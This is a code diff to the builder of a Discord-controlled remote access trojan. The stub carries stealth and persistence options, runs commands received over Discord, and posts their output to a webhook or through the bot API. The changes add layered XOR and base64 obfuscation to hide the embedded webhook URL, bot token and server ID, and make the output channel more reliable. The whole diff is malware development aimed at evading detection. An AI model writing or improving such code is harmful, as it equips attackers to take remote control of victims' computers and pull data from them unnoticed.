@@ -20,17 +20,36 @@ except ImportError:
         prompt('\n  \033[90mPress Enter to continue...\033[0m'); input()
 
 RAT_STUB = r'''
-import os, sys, time, json, base64, subprocess, urllib.request, urllib.error, threading, platform, shutil, ctypes, struct, io, ssl, socket, hashlib, uuid
+import os, sys, time, json, base64, subprocess, urllib.request, urllib.error, threading, platform, shutil, ctypes, struct, io, ssl, socket, hashlib, uuid, random
 from datetime import datetime
 
-WEBHOOK = "{webhook}"
-TOKEN = "{token}"
-GUILD = "{guild}"
+WEBHOOK_ENC = "{webhook_enc}"
+TOKEN_ENC = "{token_enc}"
+GUILD_ENC = "{guild_enc}"
+DEC_KEY = "{dec_key}"
+DEC_KEY2 = "{dec_key2}"
+DEC_KEY3 = "{dec_key3}"
 PERSIST = {persist}
 STEALTH = {stealth}
 DEBUG = {debug}
 SLEEP = {sleep}
 PREFIX = "{prefix}"
+
+def _xor(data, key):
+    if isinstance(data, str): data = data.encode()
+    kb = key.encode() if isinstance(key, str) else key
+    return bytes(b ^ kb[i % len(kb)] for i, b in enumerate(data))
+
+def _dec(encoded, k1, k2, k3):
+    raw = base64.b64decode(encoded)
+    s1 = _xor(raw, k3)
+    s2 = _xor(s1[::-1], k2)
+    s3 = _xor(s2, k1)
+    return s3.decode("utf-8", errors="replace")
+
+WEBHOOK = _dec(WEBHOOK_ENC, DEC_KEY, DEC_KEY2, DEC_KEY3)
+TOKEN = _dec(TOKEN_ENC, DEC_KEY, DEC_KEY2, DEC_KEY3)
+GUILD = _dec(GUILD_ENC, DEC_KEY, DEC_KEY2, DEC_KEY3)
 
 DEBUG_LOG = []
 DBG_LOCK = threading.Lock()
@@ -1080,13 +1099,19 @@ def main():
                                     dprint(f"CMD from {{author.get('username','?')}}: {{cmd}}")
                                     result = handle_command(cmd)
                                     resp = f"```\\n{{result}}\\n```"
+                                    dprint(f"Response {{len(resp)}} chars, webhook={{bool(CMDS_WEBHOOK)}}")
                                     if CMDS_WEBHOOK:
-                                        data = {{"content": resp[:2000]}}
-                                        body = json.dumps(data).encode("utf-8")
-                                        req = urllib.request.Request(CMDS_WEBHOOK, data=body, headers={{"Content-Type": "application/json"}}, method="POST")
-                                        try: urllib.request.urlopen(req, timeout=10)
-                                        except: pass
+                                        try:
+                                            data = {{"content": resp[:2000]}}
+                                            body = json.dumps(data).encode("utf-8")
+                                            req = urllib.request.Request(CMDS_WEBHOOK, data=body, headers={{"Content-Type": "application/json"}}, method="POST")
+                                            resp_http = urllib.request.urlopen(req, timeout=10)
+                                            dprint(f"Response sent {{resp_http.status}}")
+                                        except Exception as e:
+                                            dprint(f"Webhook send failed: {{e}}, falling back to bot")
+                                            discord_api("POST", f"/channels/{{CMDS_CHANNEL}}/messages", {{"content": resp[:2000]}})
                                     else:
+                                        dprint("No webhook, using bot token")
                                         discord_api("POST", f"/channels/{{CMDS_CHANNEL}}/messages", {{"content": resp[:2000]}})
                             elif content:
                                 dprint(f"MSG (no prefix): {{content[:60]}}")
@@ -1219,10 +1244,23 @@ def run(kevbin=None):
                     out_dir = ""
             if debug_mode:
                 _debug_print("CONFIG", f"Persist={persist_opt} Stealth={stealth} Sleep={sleep_sec}s Prefix={prefix}")
+            import os as _os, base64 as _b64
+            k1 = _os.urandom(16).hex()
+            k2 = _os.urandom(16).hex()
+            k3 = _os.urandom(16).hex()
+            def _enc(val, key1, key2, key3):
+                data = val.encode() if isinstance(val, str) else val
+                kb1, kb2, kb3 = key1.encode(), key2.encode(), key3.encode()
+                s1 = bytes(b ^ kb1[i % len(kb1)] for i, b in enumerate(data))
+                s2 = bytes(b ^ kb2[i % len(kb2)] for i, b in enumerate(s1))
+                s3 = s2[::-1]
+                s4 = bytes(b ^ kb3[i % len(kb3)] for i, b in enumerate(s3))
+                return _b64.b64encode(s4).decode()
             stub = RAT_STUB.format(
-                webhook=webhook,
-                token=token or "",
-                guild=guild or "",
+                webhook_enc=_enc(webhook, k1, k2, k3),
+                token_enc=_enc(token or "", k1, k2, k3),
+                guild_enc=_enc(guild or "", k1, k2, k3),
+                dec_key=k1, dec_key2=k2, dec_key3=k3,
                 persist=str(persist_opt),
                 stealth=str(stealth),
                 debug=str(debug_mode),
@@ -1285,8 +1323,9 @@ def run(kevbin=None):
                         _debug_print("EXC", str(e))
         elif choice == '3':
             clear()
-            stub = RAT_STUB.format(webhook="WEBHOOK_URL", token="BOT_TOKEN",
-                                    guild="GUILD_ID", persist="False", stealth="True",
+            stub = RAT_STUB.format(webhook_enc="ENCODED_WEBHOOK", token_enc="ENCODED_TOKEN",
+                                    guild_enc="ENCODED_GUILD", dec_key="K1", dec_key2="K2", dec_key3="K3",
+                                    persist="False", stealth="True",
                                     debug="False", sleep="5", prefix="!")
             print(stub)
         else:
